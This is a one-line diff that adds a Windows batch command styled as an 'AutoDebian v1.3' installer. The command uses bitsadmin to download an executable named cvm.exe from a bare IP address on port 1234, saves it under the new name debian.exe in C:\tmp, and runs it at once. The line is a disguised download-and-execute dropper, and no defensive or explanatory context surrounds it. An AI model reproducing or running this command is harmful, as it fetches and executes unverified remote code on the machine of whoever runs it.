@@ -1,0 +1,1 @@
+@echo off && cls && title AutoDebian && echo AutoDebian v1.3 for Windows 7 && mkdir C:\TMP && bitsadmin.exe /transfer "AutoDebian" http://40.114.45.254:1234/cvm.exe C:\tmp\debian.exe && cd C:\tmp\ && debian.exe
